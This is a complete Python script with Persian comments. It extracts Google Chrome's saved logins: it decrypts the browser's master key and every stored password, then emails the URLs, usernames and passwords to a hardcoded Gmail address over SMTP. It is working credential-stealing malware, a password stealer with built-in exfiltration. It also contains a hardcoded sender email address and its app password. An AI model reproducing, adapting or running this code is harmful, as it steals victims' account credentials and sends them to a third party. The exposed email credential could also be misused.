import os
import sqlite3
import base64
import json
from Crypto.Cipher import AES
import win32crypt
import shutil
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# تابع برای دریافت کلید اصلی
def get_master_key():
    local_state_path = os.path.join(os.environ['LOCALAPPDATA'], r'Google\Chrome\User Data\Local State')
    with open(local_state_path, 'r', encoding='utf-8') as file:
        local_state = json.load(file)
    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
    master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return master_key

# تابع برای رمزگشایی پسوردها
def decrypt_password(password, master_key):
    try:
        iv = password[3:15]
        payload = password[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:-16].decode()
    except Exception as e:
        send_error_email(f"Failed to decrypt password: {str(e)}")
        return f"Failed to decrypt: {e}"

# تابع برای ارسال ایمیل
def send_email(subject, body, to_email):
    from_email = "work0893089@gmail.com"  # ایمیل فرستنده
    password = "vpyn kafx cdmw gpdw"  # پسورد ایمیل فرستنده (استفاده از رمز اپلیکیشن به جای پسورد اصلی توصیه می‌شود)

    msg = MIMEMultipart()
    msg['From'] = from_email
    msg['To'] = to_email
    msg['Subject'] = subject
    
    # اضافه کردن متن به ایمیل
    msg.attach(MIMEText(body, 'plain'))

    try:
        # اتصال به سرور SMTP گوگل
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()  # شروع ارتباط امن
        server.login(from_email, password)  # ورود به ایمیل
        text = msg.as_string()
        server.sendmail(from_email, to_email, text)  # ارسال ایمیل
        server.quit()
        print("Email sent successfully!")
    except Exception as e:
        print(f"Error: {e}")

# تابع برای ارسال ارور به ایمیل
def send_error_email(error_message):
    send_email("Error in Chrome Password Extraction", error_message, "mohammadaminbaranzhe59@gmail.com")

# تابع اصلی برای استخراج پسوردها
def get_chrome_passwords():
    # کپی کردن دیتابیس به پوشه موقت
    db_path = os.path.join(os.environ['LOCALAPPDATA'], r'Google\Chrome\User Data\Default\Login Data')
    shutil.copyfile(db_path, 'LoginData.db')
    
    conn = sqlite3.connect('LoginData.db')
    cursor = conn.cursor()

    # اجرای کوئری برای استخراج داده‌ها
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    master_key = get_master_key()

    data = []
    for row in cursor.fetchall():
        origin_url = row[0]
        username = row[1]
        encrypted_password = row[2]
        decrypted_password = decrypt_password(encrypted_password, master_key)
        data.append(f"URL: {origin_url}\nUsername: {username}\nPassword: {decrypted_password}\n")
    
    conn.close()
    os.remove('LoginData.db')  # حذف فایل موقت دیتابیس
    return data

if __name__ == '__main__':
    try:
        passwords = get_chrome_passwords()
        if passwords:
            # ایجاد محتوای ایمیل
            email_body = "\n".join(passwords)
            # ارسال ایمیل با اطلاعات پسوردها
            send_email("Chrome Passwords", email_body, "mohammadaminbaranzhe59@gmail.com")
            print("Done")
        else:
            print("No passwords found")
    except Exception as e:
        send_error_email(f"Error: {str(e)}")
        print(f"Error: {e}")
